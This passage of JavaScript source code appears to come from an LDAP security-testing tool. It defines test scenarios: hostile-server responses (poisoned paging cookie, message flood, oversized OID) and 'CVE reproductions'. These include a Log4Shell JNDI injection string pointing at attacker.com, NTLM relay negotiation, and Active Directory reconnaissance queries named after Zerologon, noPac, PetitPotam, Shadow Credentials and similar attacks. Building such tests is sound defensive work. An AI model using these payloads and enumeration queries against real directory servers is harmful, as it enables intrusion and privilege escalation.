            // Wrap in BER: SEQUENCE { size INTEGER, cookie OCTET STRING }
            const cookieSeq = Buffer.concat([
              Buffer.from([0x30, 0x82, ((poisonCookie.length + 10) >> 8) & 0xFF, (poisonCookie.length + 10) & 0xFF]),
              Buffer.from([0x02, 0x02, 0x27, 0x10]), // size = 10000
              Buffer.from([0x04, 0x82, (poisonCookie.length >> 8) & 0xFF, poisonCookie.length & 0xFF]),
              poisonCookie,
            ]);
            const control = Buffer.concat([
              Buffer.from([0x30, 0x82, ((pagedOID.length + cookieSeq.length + 6) >> 8) & 0xFF, (pagedOID.length + cookieSeq.length + 6) & 0xFF]),
              Buffer.from([0x04, pagedOID.length]), pagedOID,
              Buffer.from([0x04, 0x82, (cookieSeq.length >> 8) & 0xFF, cookieSeq.length & 0xFF]),
              cookieSeq,
            ]);
            // Build SearchResultDone with controls
            const done = pkt.buildSearchResultDone(parsed.messageID, 0);
            const controls = Buffer.concat([Buffer.from([0xA0, 0x82, (control.length >> 8) & 0xFF, control.length & 0xFF]), control]);
            socket.write(Buffer.concat([done, controls]));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Poisoned paging cookie sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should treat paging cookies as opaque and not deserialize them',
  },

  {
    name: 'ldap-server-connection-flood',
    category: 'LJ',
    description: 'Server sends rapid-fire responses to test client backpressure handling',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          sent = true;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          log('Flooding client with rapid-fire responses');
          socket.write(pkt.buildBindResponse(parsed.messageID, 0));
          // Blast hundreds of unsolicited messages
          let count = 0;
          const flood = () => {
            for (let i = 0; i < 50 && !socket.destroyed; i++) {
              socket.write(pkt.buildSearchResultEntry(count + 1000,
                `cn=flood${count},dc=test`,
                { data: ['X'.repeat(1024)] }
              ));
              count++;
            }
            if (count < 500 && !socket.destroyed) {
              setImmediate(flood);
            } else {
              setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: `Flooded ${count} messages` }); }, 500);
            }
          };
          flood();
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should handle backpressure from rapid server responses',
  },

  {
    name: 'ldap-server-extended-oid-overflow',
    category: 'LJ',
    description: 'Server sends ExtendedResponse with 10KB OID string',
    side: 'server',
    serverHandler: (socket, log) => {
      return new Promise((resolve) => {
        let sent = false;
        socket.on('data', (data) => {
          if (sent) return;
          const parsed = pkt.parseLDAPMessage(data);
          if (!parsed) return;

          if (parsed.protocolOp === LDAP_OP.BindRequest) {
            sent = true;
            log('Sending ExtendedResponse with oversized OID');
            socket.write(pkt.buildBindResponse(parsed.messageID, 0));
            // Build an ExtendedResponse with a massive OID
            const bigOID = '1.3.6.1.4.1.' + '9'.repeat(10000);
            socket.write(pkt.buildExtendedResponse(0, 0, '', 'Oversized OID', bigOID));
            setTimeout(() => { socket.end(); resolve({ status: 'PASSED', response: 'Oversized OID response sent' }); }, 1000);
          }
        });
      });
    },
    expected: 'PASSED',
    expectedReason: 'Client should reject unreasonably large OID values',
  },

  // ─────────────────────────────────────────────────────────────────────────────
  //  LK — CVE Reproductions (critical)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-cve-log4shell-jndi',
    category: 'LK',
    description: 'Log4Shell — JNDI injection in LDAP attribute values',
    side: 'client',
    actions: () => {
      resetMsgId();
      const jndi = '${jndi:ldap://attacker.com/exploit}';
      return [
        ...anonBindActions(),
        { type: 'send', data: pkt.buildSearchRequest(nextMsgId(), {
          baseDN: 'dc=example,dc=com', scope: 2,
          filter: { type: 'eq', attr: 'cn', value: jndi },
          attributes: ['cn'],
        }), label: 'Log4Shell-Search' },
        { type: 'recv', timeout: 5000, label: 'Response' },
        // Also try in bind DN
        { type: 'send', data: pkt.buildBindRequest(nextMsgId(), {
          dn: jndi, password: jndi,
        }), label: 'Log4Shell-Bind' },
        { type: 'recv', timeout: 5000, label: 'Response2' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should not process JNDI lookups from client data',
  },

  {
    name: 'ldap-cve-zerologon-recon',
    category: 'LK',
    description: 'Zerologon recon — identify domain controller via RootDSE',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        searchAction('', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['defaultNamingContext', 'dnsHostName', 'serverName', 'supportedCapabilities',
           'domainFunctionality', 'forestFunctionality', 'domainControllerFunctionality'],
          { label: 'Zerologon-RootDSE' }),
        { type: 'recv', timeout: 5000, label: 'RootDSE' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return RootDSE (unauthenticated access is normal)',
  },

  {
    name: 'ldap-cve-nopac-recon',
    category: 'LK',
    description: 'noPac/samAccountName spoofing — enumerate machine accounts',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'and', filters: [
            { type: 'eq', attr: 'objectClass', value: 'computer' },
            { type: 'present', attr: 'sAMAccountName' },
          ]},
          ['sAMAccountName', 'dNSHostName', 'msDS-KeyCredentialLink', 'userAccountControl'],
          { label: 'noPac-Recon' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return machine accounts if authorized',
  },

  {
    name: 'ldap-cve-proxylogon-recon',
    category: 'LK',
    description: 'ProxyLogon recon — enumerate Exchange servers via LDAP',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('cn=Configuration,dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectClass', value: 'msExchExchangeServer' },
          ['cn', 'msExchCurrentServerRoles', 'networkAddress', 'serialNumber'],
          { label: 'ProxyLogon-ExchangeEnum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return Exchange servers if authorized',
  },

  {
    name: 'ldap-cve-petitpotam-recon',
    category: 'LK',
    description: 'PetitPotam recon — find ADCS enrollment endpoints',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('cn=Configuration,dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectClass', value: 'pKIEnrollmentService' },
          ['cn', 'dNSHostName', 'certificateTemplates', 'cACertificate'],
          { label: 'PetitPotam-ADCS' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return CA enrollment info if authorized',
  },

  {
    name: 'ldap-cve-ntlm-relay-starttls',
    category: 'LK',
    description: 'NTLM relay attempt via LDAP — negotiate + challenge capture',
    side: 'client',
    actions: () => {
      resetMsgId();
      // Initiate NTLM via SASL to capture server challenge
      const negotiate = Buffer.concat([
        Buffer.from('4E544C4D53535000', 'hex'),  // NTLMSSP\0
        Buffer.from('01000000', 'hex'),           // Type 1
        Buffer.from('97820000', 'hex'),           // Negotiate flags
        Buffer.alloc(24),                          // Domain/Workstation
      ]);
      return [
        { type: 'send', data: pkt.buildBindRequest(nextMsgId(), { mechanism: 'GSS-SPNEGO', credentials: negotiate }), label: 'NTLM-Negotiate' },
        { type: 'recv', timeout: 5000, label: 'NTLM-Challenge' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return NTLM challenge (normal SPNEGO behavior)',
  },

  {
    name: 'ldap-cve-certifried-recon',
    category: 'LK',
    description: 'Certifried (CVE-2022-26923) — enumerate certificate templates',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('cn=Configuration,dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectClass', value: 'pKICertificateTemplate' },
          ['cn', 'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag',
           'msPKI-RA-Signature', 'pKIExtendedKeyUsage'],
          { label: 'Certifried-Templates' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return certificate templates if authorized',
  },

  {
    name: 'ldap-cve-shadow-credentials',
    category: 'LK',
    description: 'Shadow Credentials — check msDS-KeyCredentialLink attribute access',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'msDS-KeyCredentialLink' },
          ['sAMAccountName', 'msDS-KeyCredentialLink'],
          { label: 'ShadowCredentials-Enum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should restrict msDS-KeyCredentialLink access',
  },

  {
    name: 'ldap-cve-rbcd-enum',
    category: 'LK',
    description: 'RBCD — enumerate msDS-AllowedToActOnBehalfOfOtherIdentity',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'present', attr: 'msDS-AllowedToActOnBehalfOfOtherIdentity' },
          ['sAMAccountName', 'msDS-AllowedToActOnBehalfOfOtherIdentity'],
          { label: 'RBCD-Enum' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return RBCD config if authorized',
  },

  {
    name: 'ldap-cve-dcshadow-recon',
    category: 'LK',
    description: 'DCShadow recon — enumerate NTDS settings and replication metadata',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('cn=Sites,cn=Configuration,dc=example,dc=com', SEARCH_SCOPE.wholeSubtree,
          { type: 'eq', attr: 'objectClass', value: 'nTDSDSA' },
          ['cn', 'dNSHostName', 'invocationId', 'options'],
          { label: 'DCShadow-NTDS' }),
        { type: 'recv', timeout: 10000, label: 'Results' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Server should return NTDS settings if authorized',
  },


  // ─────────────────────────────────────────────────────────────────────────────
  //  LL — Connectivity & Baseline (info)
  // ─────────────────────────────────────────────────────────────────────────────

  {
    name: 'ldap-rootdse-query',
    category: 'LL',
    description: 'RootDSE query — unauthenticated base-scope search on empty DN',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        searchAction('', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['namingContexts', 'supportedLDAPVersion', 'supportedControl',
           'supportedExtension', 'supportedSASLMechanisms', 'vendorName', 'vendorVersion',
           'defaultNamingContext', 'schemaNamingContext', 'configurationNamingContext',
           'rootDomainNamingContext', 'supportedCapabilities',
           'dnsHostName', 'serverName', 'domainFunctionality'],
          { label: 'RootDSE' }),
        { type: 'recv', timeout: 5000, label: 'RootDSE-Entry' },
        { type: 'recv', timeout: 5000, label: 'SearchResultDone' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Baseline: every LDAP server must support RootDSE query',
  },

  {
    name: 'ldap-schema-discovery',
    category: 'LL',
    description: 'Schema discovery — read subschemaSubentry from RootDSE',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        searchAction('', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['subschemaSubentry'],
          { label: 'SchemaDiscovery' }),
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Baseline: discover schema location',
  },

  {
    name: 'ldap-full-lifecycle',
    category: 'LL',
    description: 'Full lifecycle — bind → search → unbind',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        ...anonBindActions(),
        searchAction('', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['namingContexts']),
        { type: 'recv', timeout: 5000, label: 'SearchEntry' },
        { type: 'recv', timeout: 5000, label: 'SearchDone' },
        { type: 'send', data: pkt.buildUnbindRequest(nextMsgId()), label: 'Unbind' },
        { type: 'close', label: 'Close' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Baseline: verify full request lifecycle works',
  },

  {
    name: 'ldap-supported-controls',
    category: 'LL',
    description: 'Query supported controls from RootDSE',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        searchAction('', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['supportedControl']),
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Baseline: discover supported LDAP controls',
  },

  {
    name: 'ldap-naming-contexts',
    category: 'LL',
    description: 'Query all naming contexts (directory partitions)',
    side: 'client',
    actions: () => {
      resetMsgId();
      return [
        searchAction('', SEARCH_SCOPE.baseObject,
          { type: 'present', attr: 'objectClass' },
          ['namingContexts', 'defaultNamingContext']),
        { type: 'recv', timeout: 5000, label: 'Response' },
      ];
    },
    expected: 'PASSED',
    expectedReason: 'Baseline: discover directory tree structure',
  },

];


// ═══════════════════════════════════════════════════════════════════════════════
//  EXPORT FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

function getLdapScenario(name) {
  return LDAP_SCENARIOS.find(s => s.name === name);
}

function getLdapScenariosByCategory(cat) {
  return LDAP_SCENARIOS.filter(s => s.category === cat.toUpperCase());
}

function listLdapScenarios() {
  const grouped = {};
  for (const s of LDAP_SCENARIOS) {
    if (!grouped[s.category]) grouped[s.category] = [];
    grouped[s.category].push(s);
  }
  return { categories: LDAP_CATEGORIES, scenarios: grouped, all: LDAP_SCENARIOS };
}

function listLdapClientScenarios() {
  return LDAP_SCENARIOS.filter(s => s.side === 'client');
}

function listLdapServerScenarios() {
  return LDAP_SCENARIOS.filter(s => s.side === 'server');
}


module.exports = {
  LDAP_SCENARIOS,
  LDAP_CATEGORIES,
  LDAP_CATEGORY_SEVERITY,
  LDAP_CATEGORY_DEFAULT_DISABLED,
  getLdapScenario,
  getLdapScenariosByCategory,
  listLdapScenarios,
  listLdapClientScenarios,
  listLdapServerScenarios,
};
